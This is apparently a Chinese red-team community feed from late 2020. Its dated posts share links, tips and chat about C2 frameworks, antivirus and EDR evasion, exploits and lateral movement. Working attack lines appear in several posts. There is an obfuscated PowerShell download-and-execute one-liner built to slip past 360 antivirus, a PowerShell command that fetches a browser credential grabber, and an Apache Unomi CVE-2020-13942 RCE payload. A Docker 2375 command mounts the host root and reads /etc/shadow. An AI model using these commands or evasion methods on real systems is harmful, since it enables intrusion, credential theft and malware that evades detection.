`#外网渗透技巧#`  <br>针对护网模式，信息搜集讲的到位哇。<br><br>[攻防演练模式下的信息收集--Fofa工程师](https://mp.weixin.qq.com/s/vXJ7Tmr1-xlgE0AwB8RxAA)


# RedTeaming - 2020-10-28
`#提权#` <br>[Zero+Day+Initiative+—+CVE-2020-16939:+Windows+Grou...](https://www.thezdi.com/blog/2020/10/27/cve-2020-16939-windows-group-policy-dacl-overwrite-privilege-escalation)<br><br>[https://github.com/rogue-kdc/CVE-2020-16939/](https://github.com/rogue-kdc/CVE-2020-16939/)

```
Wing: win10 没成功。。
```
# RedTeaming - 2020-10-29
`#漏洞利用#` <br><br>[GitHub+-+RedTeamWing/CVE-2020-14882:+CVE-2020-1488...](https://github.com/RedTeamWing/CVE-2020-14882)


# RedTeaming - 2020-10-30
`#APT分析报告#` <br>美人鱼(Infy)APT组织的归来——使用最新的Foudre后门进行攻击活动的分析<br>[美人鱼(Infy)APT组织的归来——使用最新的Foudre后门进行攻击活动的分析](https://mp.weixin.qq.com/s/SY1oZO9I0VBn1BXEQolWEw)


# RedTeaming - 2020-10-31
Cs4源码，[GitHub+-+Freakboy/CobaltStrike:+CobaltStrike's+sou...](https://github.com/Freakboy/CobaltStrike)


# RedTeaming - 2020-11-01
了 360 拦截 powershell 上线这个问题，后来测试一下发现还是可以绕过的，思路如下，使用多个 - w normal 填充，最后使用 alisa 别名更改 iex，就可以绕过 360 了。

```
Wing: 漏了？
lengyi: 漏了？啥意思？
Wing: 短的代码还好，长的代码就很麻烦。需要脚本。
lengyi: 嗯嗯，就只说的那个 iex 上线。。
Wing: 扔个 demo
lengyi: 一会丢
```
# RedTeaming - 2020-11-01
#CSTips<br>CROSSC2 已经支持 4.1 版本，跨平台上线的需求基本满足了，内置的插件虽然在我电脑没成功，但是支持 ssh 和文件上传下载就很好了。cs 就是用来做一个简单的权限维持。


# RedTeaming - 2020-11-02
powershell.exe-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormalset-alias-namekey-valueIEX;key(New-Object<br>Net.WebClient).DownloadString('ht‘+’tp://x.x.x.x/a')

```
lengyi: 补上，记得空格。粘贴过来，空格就没了
```
# RedTeaming - 2020-11-02
powershell.exe-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-wNormal-w<br>Normal-wNormal-wNormal-wNormalset-alias-namekey-valueIEX;key(New-Object<br>Net.WebClient).DownloadString('ht‘+’tp://x.x.x.x/a')

```
lengyi: 补上，记得空格。粘贴过来，空格就没了
```
# RedTeaming - 2020-11-04
`#漏洞挖掘#`  <br><br>[APP渗透+｜+安卓模拟器7.0以上的抓包方法](https://mp.weixin.qq.com/s/jx1IsQAiyaW1jZY8H6WvVg)

```
L: app抓不到包的解决方法：[当你写爬虫抓不到APP请求包的时候该怎么办？【中级篇】+-+知乎](https://zhuanlan.zhihu.com/p/56397466)
```
# RedTeaming - 2020-11-05
#CSTips<br>PEzor已经支持集成到CS里面,目前还没法在Mac上用,只能在Kali里面安装.有些依赖应该是Linux下特有的.<br>晚上有时间我再测试下效果,感兴趣的也一起玩下.<br><br>[phra's+blog+~+Technical+posts+about+InfoSec](https://iwantmore.pizza/posts/PEzor2.html)


# RedTeaming - 2020-11-09
`#漏洞挖掘#`  <br>有key无解<br>云上渗透-RDS数据库攻防<br>[云上渗透-RDS数据库攻防+-+先知社区](https://xz.aliyun.com/t/8451)

```
CoolCat: 实际上有 asak 之后，有不触发警告不需要密码就能 shell 机器本身的法子，实战遇到过，也有人公开写过
```
# RedTeaming - 2020-11-10
`#没啥用的Tips#`  <br>一文简单介绍DevOps<br><br>[DevOps到底是什么意思？+-+知乎](https://zhuanlan.zhihu.com/p/91371659)


# RedTeaming - 2020-11-10
`#C2#` <br>有时间搭建的同学分享下使用心得，打工人加油。<br>[GitHub+-+MythicAgents/Apollo:+A+.NET+Framework+4.0...](https://github.com/MythicAgents/Apollo)


# RedTeaming - 2020-11-12
 `#C2#`  <br>SharpC2实验分支现在能够正常使用了，目前功能模块还比较少。<br><br>然后就是编译方面，需要.NET5，这里的.NET5安装需要注意一个点，官网下载的版本必须要和你现在所使用的VS版本对应，不然识别不到。<br>编译成功后，默认不允许用https，需要使用dotnet开启，自己查一下命令。<br>记得选择实验分支。


# RedTeaming - 2020-11-12
`#漏洞分析#` <br><br>[漏洞分析｜SaltStack未授权访问及命令执行漏洞分析（CVE-2020-16846/25592）](https://mp.weixin.qq.com/s/R8qw_lWizGyeJS0jOcYXag)


# RedTeaming - 2020-11-13
`#C2#` <br>Mythic<br>A cross-platform, post-exploit, red teaming framework designed to provide a collaborative and user friendly interface for operators.<br>link: [https://docs.mythic-c2.net/](https://docs.mythic-c2.net/)


# RedTeaming - 2020-11-13
`#漏洞利用#` <br>全<br><br>[Thinkphp5+RCE总结+–+Y4er的博客](https://y4er.com/post/thinkphp5-rce/#method-__contruct%E5%AF%BC%E8%87%B4%E7%9A%84rce-%E5%90%84%E7%89%88%E6%9C%ACpayload)


# RedTeaming - 2020-11-14
`#内网渗透工具#`  <br>各种式样的Go版内网扫描工具<br><br>[GitHub+-+k8gege/LadonGo:+Ladon+Scanner+For+Golang+...](https://github.com/k8gege/LadonGo)<br>[GitHub+-+shadow1ng/fscan](https://github.com/shadow1ng/fscan)<br>[GitHub+-+uknowsec/TailorScan:+自用缝合怪内网扫描器，支持端口扫描，识别...](https://github.com/uknowsec/TailorScan)<br>[GitHub+-+Adminisme/ServerScan:+ServerScan一款使用Golan...](https://github.com/Adminisme/ServerScan)<br><br>Anything else?

```
裤衩哥: c# 永不为奴
```
# RedTeaming - 2020-11-16
[ZBN+SOAR介绍+·+语雀](https://www.yuque.com/zbn/docs/ayilv9)


# RedTeaming - 2020-11-18
整理测试了一些bypass Amsi的手法。<br><br><br><br><br> `#免杀#`  <br><br>[bypassAMSI+Wd+-+裤衩哥的小屋](http://8sec.cc/index.php/archives/439/)
![](https://images.zsxq.com/FirWWsbAeXNqv33vRhZdGwTzWJvL?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Ca7IqamDpAio4C4ZxzEciUDSjm0=)
```
RainismG: 可以，学习了
裤衩哥: 点个赞点个赞点个赞
```
# RedTeaming - 2020-11-18
[利用windows+terminal进行权限维持](https://mp.weixin.qq.com/s/PaHdUV3omiFQt7qV5bnTzA)

```
Black cher*: 不敢用了 [奸笑]
```
# RedTeaming - 2020-11-19
 `#漏洞利用#`  <br><br>#CVE-2020-13942 Apache Unomi Remote Code Execution<br><br>PoC:<br>{"filters":[{"id" : "pyn3rd","filters": [{"condition": {"parameterValues": {"pyn3rd": "script::Runtime.getRuntime().exec('open -a Calculator')"},"type":"profilePropertyCondition"}}]}],"sessionId": "pyn3rd"}


# RedTeaming - 2020-11-19
`#内网渗透技巧#`  <br>haya的小工具，360安全浏览器解密。<br><br>[GitHub+-+hayasec/360SafeBrowsergetpass:+这是一个一键辅助抓取...](https://github.com/hayasec/360SafeBrowsergetpass)


# RedTeaming - 2020-11-20
`#内网渗透工具#`  <br>BloodHound的简明教程<br><br>[利用BloodHound分析域中的攻击路径+-+先知社区](https://xz.aliyun.com/t/7311)


# RedTeaming - 2020-11-21
猎犬4.0更新<br><br>wiki：[BloodHound:+Six+Degrees+of+Domain+Admin+—+BloodHou...](https://bloodhound.readthedocs.io/en/latest/)<br>github：[Release+BloodHound+4.0+-+Azurehound+·+BloodHoundAD...](https://github.com/BloodHoundAD/BloodHound/releases/tag/4.0.0)<br>youtube：[https://www.youtube.com/watch?v=tOwvyXGpVvo&ab_cha...](https://www.youtube.com/watch?v=tOwvyXGpVvo&ab_channel=robbinsandy)


# RedTeaming - 2020-11-21
`#免杀#`   `#钓鱼攻击#` <br>office vba bypass av<br>测试对象:赛门+360
![](https://images.zsxq.com/FiAiDeRV7ffmKEtReWkrLMvLK1Or?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:1aTLCE4nLynXhUM8y_KkMooy8Tg=)
![](https://images.zsxq.com/FgxJbKTqYi9UR1-xwtXcdYesgDFU?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:kg51QzDjA6rDrzsjQPDFxBfON28=)
```
Wing: [Purgalicious+VBA:+Macro+Obfuscation+With+VBA+Purgi...](https://www.fireeye.com/blog/threat-research/2020/11/purgalicious-vba-macro-obfuscation-with-vba-purging.html)<br>大家感兴趣的可以测试一下,有问题的就hand up!
```
# RedTeaming - 2020-11-21
`#没啥用的Tips#`  <br>C#、.NET Framework、CLR的关系<br><br>[C#、.NET+Framework、CLR的关系_匆匆那年-CSDN博客](https://blog.csdn.net/lidandan2016/article/details/77868043)


# RedTeaming - 2020-11-21
`#没啥用的Tips#`  <br>C#、.NET Framework、CLR的关系<br><br>[C#、.NET+Framework、CLR的关系_匆匆那年-CSDN博客](https://blog.csdn.net/lidandan2016/article/details/77868043)


# RedTeaming - 2020-11-21
`#免杀#`   `#内网渗透技巧#` <br><br>[Shellcode+Runner+Bypass+AV](https://mp.weixin.qq.com/s/Hiq0lQVJ7KEiX3yc0TkdaA)

```
Wing: 随缘更新，木得时间。
```
# RedTeaming - 2020-11-21
`#内网渗透技巧#`  <br>用的时候地址换成国内的<br><br>powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('[http://bit.ly/2K75g15')"](http://bit.ly/2K75g15')")<br><br>[GitHub+-+HanseSecure/credgrap_ie_edge:+Extract+sto...](https://github.com/HanseSecure/credgrap_ie_edge)
![](https://images.zsxq.com/Fk5jbgesVLJ0DucHkKz7QzwXrgtQ?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:jX5uQlXdBK1vdakoi-uOXX1YED4=)

# RedTeaming - 2020-11-22
`#C2#` <br>上次说的C2 Mythic,昨晚体验了一下.<br>[跨平台C2-Mythic不明觉厉教程](https://mp.weixin.qq.com/s?__biz=MzUyMDgzMDMyMg==&mid=2247483957&idx=1&sn=c95fd190bed241ec0541131922670496&chksm=f9e52e28ce92a73e2a7eedf83357dfe88bfe435586871c409492d15ec6ea61bd0c5face4ea06&scene=0&xtrack=1#rd)

```
Black cher*: 牛逼
```
# RedTeaming - 2020-11-22
 `#安全开发#` <br>发一份C的api文档
![](https://images.zsxq.com/FpoDxCEZkeHJx0enFotesYwJIR2U?e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:Hx8wnFtq3GqTy8pe9A_5VyfInlw=)
```
Wing: 不好学，不喜欢.Too long
裤衩哥: 偏不看，有需要现百度 [旺柴]
Chickensay: 就不看哈哈哈
```
# RedTeaming - 2020-11-22
 `#没啥用的Tips?#`  <br><br>真的是牛逼,一招解决阿里云国内ECS git clone 慢的问题<br><br>vim /etc/ssh/ssh_config<br><br>: / GSSAPIAuthentication no<br><br>注释掉这一行,速度起飞.<br><br>啊我艹,我之前一直用绑定hosts的方法,神马玩意.
![](https://images.zsxq.com/Fkf8Fg1673szmf78v3lAuMW74wam?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:vCqJj6kg8tFGPI6gYVNEuEBbQhg=)
![](https://images.zsxq.com/Fr3_g6mPXOHRrsKsjyjs3fOROk7n?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:x9f-h23e5pt0q_fNehOUuAOdmjk=)
```
Wing: 之前每秒 3k……
RBPi: 我之前一直都是挂了代理 clone
```
# RedTeaming - 2020-11-23
CobaltStrikeScan 这个东东，也就是可以扫描 cs 的 beacon 的东西，正好看到 Wbglil 师傅发了绕过的方法，就分享一下，将 profile 的 set cleanup "true"; 就可以绕过去了。顺便说一下 CobaltStrike 的 execute-assembly, 除了 a-team 星球发的会落地文件检测之外，ETW 也是一个很好的检测的点，可以 patch 掉绕过，clr.dll 也可以作为主要检测的点，也有了开源工具，可以进行内存的 dump，名字叫 Sniper, 不过本人不懂 c#，用了一下感觉并不怎么样，留坑


# RedTeaming - 2020-11-23
`#免杀#`   `#安全开发#` <br><br>测试了一个第三方库,拿来就用.<br>.NET3.5版本和.NET4.0版本<br><br>但是刚用没多久就被云查杀了,360有点猛.<br><br>另外,推荐个库,Fody,是个好东西.<br><br>[https://github.com/cobbr/SharpSploit/blob/master/S...](https://github.com/cobbr/SharpSploit/blob/master/SharpSploit/SharpSploit%20-%20Quick%20Command%20Reference.md)
![](https://images.zsxq.com/FhBiCLpIobgxK0hsR1nz-AWSU_eT?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ZV0wLrgGlRLOgcg5iSeGVoY2uD0=)

# RedTeaming - 2020-11-24
`#免杀#`   `#安全开发#` <br>Offensive Nim<br>Nim借助Mingw进行跨平台编译


# RedTeaming - 2020-11-25
`#内网渗透技巧#`  <br>通过猕猴桃注入管理员hash登录3389<br><br>[攻击3389之PTH](https://mp.weixin.qq.com/s/mVSc5geSYwncpOda1OT-0g)


# RedTeaming - 2020-11-26
`#没啥用的Tips?#`  <br>一周技术汇总<br>New macOS C2 (@cedowens), Nim implant (@NotoriousRebel1), x64 AMSI bypass in VBA (@rd_pentest), VBA purging tool (@h4wkst3r/@AndrewOliveau), macOS privesc via MS Teams (@theevilbit), Kali tool developer partnership (@kalilinux/@byt3bl33d3r), and more!<br>来源<br>[Last+Week+in+Security+(LWiS)+-+2020-11-23+|+Bad+Se...](https://blog.badsectorlabs.com/last-week-in-security-lwis-2020-11-23.html)


# RedTeaming - 2020-11-26
`#安全开发#` <br>SharpGen利用分析<br>[SharpGen利用分析+–+3gstudent+–+Good+in+study,+attitude...](https://3gstudent.github.io/3gstudent.github.io/SharpGen%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90/)


# RedTeaming - 2020-11-30
`#安全开发#`   `#自动化#`  <br>Rengine是一个自动化平台,我之前用过,当时功能比较少,后面我就自己写了,可以作为参考开发。另外就是应该不支持分布式扫描,但是核心的引擎可以拿出来用,以及前端的UI的功能细节可以作为一个参考。欢迎交流。<br><br>[GitHub+-+yogeshojha/rengine:+reNgine+is+an+automat...](https://github.com/yogeshojha/rengine)
![](https://images.zsxq.com/FmH_uDQcpQ5ZGCSM9qCqoDJRcmdP?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:D1MjryscUifX3cuqkJFhykaKGbw=)
![](https://images.zsxq.com/FsEYaGliGNvrDoHqYiP0jVXlDb5R?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:hQ14ftMKLtzNdXkQN6-CpitGLIU=)
![](https://images.zsxq.com/FlZBnZgw0Hza2UXqymopT3KNPpn0?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:2FhZ2HIz7lYEknBVurMiIIPmOL8=)

# RedTeaming - 2020-12-01
`#免杀#`   `#红队武器化研发#`   `#二进制安全#`  <br>星球某位嘉宾的作品,懂的都懂。<br><br>[GitHub+-+knownsec/shellcodeloader:+shellcodeloader](https://github.com/knownsec/shellcodeloader)

```
.m0ngo0nse: 欢迎 start，遇到 bug 或者有新的加载方式想分享做成模板欢迎提 issue。新的模板我会更新到 dev 分支，主分支修复 bug。
```
# RedTeaming - 2020-12-01
`#蚁剑插件#`  <br>As-Exploits: 中国蚁剑后渗透框架<br>1. 修复哥斯拉内存马连接问题<br>2. 新增about模块，附上版本更新日志<br>开源+文档：<br>[GitHub+-+yzddmr6/As-Exploits:+中国蚁剑后渗透框架](https://github.com/yzddmr6/As-Exploits)<br>[As-Exploits:+中国蚁剑后渗透框架+|+yzddMr6's+Blog](https://yzddmr6.tk/posts/as-exploits/)


# RedTeaming - 2020-12-02
`#内网渗透工具#`  <br>利用ntlm hash横向，支持批量dump，winrm模块支持较多功能。<br><br><br><br>[GitHub+-+cube0x0/SharpMapExec](https://github.com/cube0x0/SharpMapExec)
![](https://images.zsxq.com/FjM4PjcCQCJBwD70o6XtbrAVvif-?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:MSxI6wz3AJNhOLsBaUU-dt8ilTo=)

# RedTeaming - 2020-12-02
随便写写<br><br>[使用ReflectiveDLLInjection武装你的CobaltStrike](https://mp.weixin.qq.com/s/-Inh6uWV9YCz0zQYfitceA) `#红队武器化研发#` 


# RedTeaming - 2020-12-02
`#红队技巧#` <br><br>[关于CobaltStrike的Stager被扫问题](https://mp.weixin.qq.com/s/hz9lZidZXgbPrkI32pCdVQ)


# RedTeaming - 2020-12-03
`#基础设施#` <br>Windows下也有一键安装软件的，用cinst。<br><br>Linux 环境部署脚本，一键配置系统设置，安装常用工具/开发环境/渗透测试工具<br><br>[init.sh/init.sh+at+main+·+al0ne/init.sh+·+GitHub](https://github.com/al0ne/init.sh/blob/main/init.sh)

```
z3r0yu: 原来是 Chocolatey 学习了
```
# RedTeaming - 2020-12-05
`#红队技巧#` <br>关于stager被扫的新解决方法 [Bypass+cobaltstrike+beacon+config+scan](https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw)


# RedTeaming - 2020-12-05
`#红队技巧#` <br>关于stager被扫的新解决方法 [Bypass+cobaltstrike+beacon+config+scan](https://mp.weixin.qq.com/s/fhcTTWV4Ddz4h9KxHVRcnw)


# RedTeaming - 2020-12-06
`#漏洞利用#`  <br>另外还有斗象护网之前发的漏洞库<br><br>[红队中易被攻击的一些重点系统漏洞整理](https://mp.weixin.qq.com/s/6I-Yp0A69rLr3RfruIAkhA)


# RedTeaming - 2020-12-06
`#漏洞利用#` <br><br>[2020攻防演练弹药库-您有主机上线请注意+-+斗象能力中心](https://blog.riskivy.com/2020%e6%94%bb%e9%98%b2%e6%bc%94%e7%bb%83%e5%bc%b9%e8%8d%af%e5%ba%93-%e6%82%a8%e6%9c%89%e4%b8%bb%e6%9c%ba%e4%b8%8a%e7%ba%bf%e8%af%b7%e6%b3%a8%e6%84%8f/?from=timeline&isappinstalled=0)


# RedTeaming - 2020-12-06
`#漏洞分析#` <br><br>[Apache+Shiro+<1.2.4反序列化分析](https://mp.weixin.qq.com/s/ayZKDVnN7zEbKjo5w8uqxQ)


# RedTeaming - 2020-12-06
 `#红队红线#` <br>去掉pdb调试信息<br>不一定全部去掉了,我本地grep没发现我的用户名<br>dotnet build /p:DebugType=None /p:DebugSymbols=false


# RedTeaming - 2020-12-07
`#免杀#`  <br>API Hashing技术（有错误的话在下面补充一下）<br>1. 先计算出api对应的Hash值,以CreateThread为例<br>2. 再通过getHashFromString反向得到地址<br>3. 自定义一个函数指向这个hash解析得到的虚拟地址<br>4. 调用自定义函数,实现相同效果。<br>5. 在IAT实现了隐藏。<br><br>[https://www.ired.team/offensive-security/defense-e...](https://www.ired.team/offensive-security/defense-evasion/windows-api-hashing-in-malware)
![](https://images.zsxq.com/Fl5JC_Sf9c75c0OcRtRvo3VofXa2?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:X-UrPPsjPTT8emtbHoE7Y6L5eS0=)
```
裤衩哥: 虚拟机地址代替函数名，
裤衩哥: 怎么打了个机。。。
lengyi: X86 成功，x64 失败
```
# RedTeaming - 2020-12-07
`#C2#`  <br>市面上流行的C2集合<br><br>[Ask+The+C2+Matrix](http://ask.thec2matrix.com/)


# RedTeaming - 2020-12-08
 `#BypassAV#`  <br>Bypass EDR Hook<br>使用Csharp实现动态识别EDR Hook<br>具体：<br>实现一个staging服务器,负责序列化和反序列化<br><br> 1 在目标上识别到Hook时,将结果发送给服务器。<br>2 服务器反序列化数据,基于syscall生成一段代码,动态编译,序列化后发送给目标。<br>3. 目标接收后,在对应的进程中执行<br>4. 和C2实现交互。<br><br>这样的好处是既实现了动态识别,也能够避免使用次数多以后被静态查杀。

```
Wing: [https://posts.specterops.io/adventures-in-dynamic-...](https://posts.specterops.io/adventures-in-dynamic-evasion-1fe0bac57aa)
```
# RedTeaming - 2020-12-08
`#内网渗透技巧#`  <br>用Rdp服务起一个s5代理,作为后门或者用在横向上挺好。<br><br>[GitHub+-+nccgroup/SocksOverRDP:+Socks5/4/4a+Proxy+...](https://github.com/nccgroup/SocksOverRDP)

```
-: 真不错有机会试试
```
# RedTeaming - 2020-12-09
火眼武器库被人偷了,搞安全的太难了。<br>肉眼数了一下,50+的工具。<br><br>[GitHub+-+fireeye/red_team_tool_countermeasures](https://github.com/fireeye/red_team_tool_countermeasures)
![](https://images.zsxq.com/FjzfG3rUA_rjSKqU20TAIHVcHuf4?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:_pArddq5xxXhaPBwOe6fp6rfDsM=)
![](https://images.zsxq.com/Fj8Bt0CvGJW6wHFNXMiuJerbyILv?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:h4XtSxCYDCbHS67vAJghnxcYhXc=)
```
z3r0yu: 想知道什么时候会泄露出来
H01k: github 这个是泄露的工具嘛？
Wing: 只是工具匹配的 yara 规则。
```
# RedTeaming - 2020-12-10
火眼泄漏了很多工具，其中不乏一些开源工具的二开版本，这里整理了几个可以找得到的地址，希望有用吧：<br><br>[GitHub+-+IllidanS4/SharpUtils:+Various+tools+and+h...](https://github.com/IllidanS4/SharpUtils)<br>[GitHub+-+med0x2e/NoAmci:+Using+DInvoke+to+patch+AM...](https://github.com/med0x2e/NoAmci)<br>[GitHub+-+fireeye/DueDLLigence](https://github.com/fireeye/DueDLLigence)


# RedTeaming - 2020-12-11
复现了一下<br><br>[CVE-2020-17049+Kerberos+Bronze+Bit+攻击复现](https://mp.weixin.qq.com/s/By1Vjm-t4CxjUaTEV_ykVg)

```
Wing: 可以
```
# RedTeaming - 2020-12-11
`#钓鱼攻击#`   `#无线安全#`  <br>下午尝试了一下,还差点东西。<br><br>[802.11无线网络之WPA企业版安全攻防](https://mp.weixin.qq.com/s/9P63zreVpdq0NChe0v5yKw)


# RedTeaming - 2020-12-12
`#内网渗透技巧#`  <br>MImikatz是如何实现pth的<br>[Inside+the+Mimikatz+Pass-the-Hash+Command+(Part+1)](https://www.praetorian.com/blog/inside-mimikatz-part1)


# RedTeaming - 2020-12-12
`#红队技巧#` <br>WiFi Pineapple之Evil Portal<br><br>ps:大菠萝不适合企业环境.<br>[WiFi+Pineapple之Evil+Portal](https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652487407&idx=1&sn=230961321f8bde69a2d3d0707f154e2a&chksm=f2581d5cc52f944af44a839cf7e82ed188167953f67c2b2f04e05b42c03b58a58d1ef2810e50&scene=0&xtrack=1#rd)


# RedTeaming - 2020-12-12
 `#C2#`  <br>尝试弄一个,需要一些mips环境,go方便上线。
![](https://images.zsxq.com/Fi4RT1lx_1CP2iZzhYOAx-J01_RL?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:FpJ-_BVjkrfPS3MZSkSBq5PD0BI=)
```
裤衩哥: 你平时是真没事情 [撇嘴]
Wing: 只能晚上下班写啊。卧槽。
crazyman: 这 tql 吧
yuhao: ui 有点好看哇
```
# RedTeaming - 2020-12-13
周末花了点时间看了看 Nim，这个简直就是 python+c 的结合物（仅限于 win 编程，其他的我也用不着），只要掌握了数据类型的转换，其他的就是手到擒来的事了。除了体积大之外，还真的没啥缺点了。有兴趣的师傅可以玩一玩。
![](https://images.zsxq.com/FmLMDAkhFu1ZFCpIy5Yf4WTzTe2y?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lcfJ4YsxrFn-gbYAYktEHTVTK9w=)
```
crazyman: 别学了 跟不上了
```
# RedTeaming - 2020-12-14
`#C2#`  <br>JARM是一种TLS服务器指纹识别工具。它的工作方式是主动向目标TLS服务器发送10个TLS客户端Hello包，并捕获TLS服务器Hello响应的特定属性。然后，以特定的方式计算TLS服务器响应的hash，以生成JARM指纹。通过这个工具@cedowens 给出了一份儿常见的c2指纹。例如：<br>Cobalt Strike的指纹是07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1<br><br>那么问题来了，如何客制化Cobalt Strike我们才能规避这个问题呢？<br><br>JARM工具链接: [GitHub+-+salesforce/jarm](https://github.com/salesforce/jarm)<br>C2-JARM指纹链接: [GitHub+-+cedowens/C2-JARM:+A+list+of+JARM+hashes+f...](https://github.com/cedowens/C2-JARM)


# RedTeaming - 2020-12-14
`#漏洞利用#`  <br>FortiGate SSL-VPN 漏洞扫描和利用工具。<br><br>[Fortiscan+-+A+High+Performance+FortiGate+SSL-VPN+V...](https://www.kitploit.com/2020/11/fortiscan-high-performance-fortigate.html?utm_source=dlvr.it&utm_medium=twitter&m=1)


# RedTeaming - 2020-12-14
 `#漏洞挖掘#`  <br>ssrf mindmap<br>能不能弄一个自动化脚本。一键生成这些格式,有时间做一个网页版的。
![](https://images.zsxq.com/FjoxlzmcgJCjGbpjaL3Nqrhj8a26?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BuAlpMLJ_Vq54SzSKgl2Q-mJ9uQ=)

# RedTeaming - 2020-12-14
 `#漏洞挖掘#`  <br>ssrf mindmap<br>能不能弄一个自动化脚本。一键生成这些格式,有时间做一个网页版的。
![](https://images.zsxq.com/FjoxlzmcgJCjGbpjaL3Nqrhj8a26?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:BuAlpMLJ_Vq54SzSKgl2Q-mJ9uQ=)

# RedTeaming - 2020-12-14
`#CSTips#`  <br>腾讯云直接免费<br><br>[为你的C2隐藏与加速](https://mp.weixin.qq.com/s/6nBrRJHFFpCw4N90n8aURA)


# RedTeaming - 2020-12-15
 `#漏洞利用#`  <br>Docker 2375快速Rce<br><br>docker -H <host>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine<br><br>File Access: cat /mnt/etc/shadow<br>RCE: chroot /mnt


# RedTeaming - 2020-12-17
 `#内网渗透#` 
![](https://images.zsxq.com/FvrjOzviAYZb6upvr8mXMELRQjjY?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1612108799&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:DtvhLccYytpAB7tzFA2fRllw1Pg=)

# RedTeaming - 2020-12-17
`#内网渗透技巧#`  <br>死星2.0<br>[GitHub+-+byt3bl33d3r/DeathStar:+Uses+Empire's+(htt...](https://github.com/byt3bl33d3r/DeathStar)


# RedTeaming - 2020-12-17
`#BypassAV#`   `#免杀#`  <br>宏免杀<br><br>[邮件攻防--宏免杀姿势2](http://wolvez.club/2020/12/17/macro/)


# RedTeaming - 2020-12-18
`#没啥用的Tips#` <br>让你的ECS每秒10M地clone项目<br>[https://chrome.google.com/webstore/detail/github%E...](https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/mfnkflidjnladnkldfonnaicljppahpg?utm_source=chrome-ntp-icon)<br><br>gcl [https://github.91chifun.workers.dev//https://githu...](https://github.91chifun.workers.dev//https://github.com/iiiusky/alicloud-tools.git)


# RedTeaming - 2020-12-19
